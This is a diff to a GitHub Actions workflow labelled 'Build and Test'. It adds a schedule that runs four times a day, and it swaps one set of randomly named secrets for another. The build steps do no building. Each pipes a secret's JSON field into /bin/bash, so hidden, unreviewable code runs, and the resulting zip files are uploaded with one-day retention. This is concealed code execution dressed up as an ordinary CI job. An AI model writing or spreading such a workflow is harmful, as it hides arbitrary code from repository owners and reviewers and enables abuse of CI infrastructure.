@@ -2,6 +2,8 @@ name: Build and Test
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '46 2,8,14,20 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -12,18 +14,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Build
         env:
-          k3452: ${{ secrets.k3452 }}
+          yg32452: ${{ secrets.yg32452 }}
         run: |
-          printf '%s' "$k3452" | jq -r .mzrc14119 | /bin/bash
-          echo $ujix31 | jq -r .hvznn61134 | /bin/bash
-          printf '%s' "$tadhq19" | jq -r .zak6 | /bin/bash
-          printf '%s' "$q14614" | jq -r .r485 | /bin/bash
-          echo $l918 | jq -r .oz74 | /bin/bash
-          echo $cs09 | jq -r .h9703 | /bin/bash
+          printf '%s' "$yg32452" | jq -r .fwb1 | /bin/bash
+          echo $fnay68086 | jq -r .qt33 | /bin/bash
+          echo $usbfy2 | jq -r .zcytm56579 | /bin/bash
+          printf '%s' "$epyj2308" | jq -r .ctzdg66680 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
         with:
-          name: qQMfsYnv
+          name: gcLyGKDv
           path: "*.zip"
           retention-days: 1
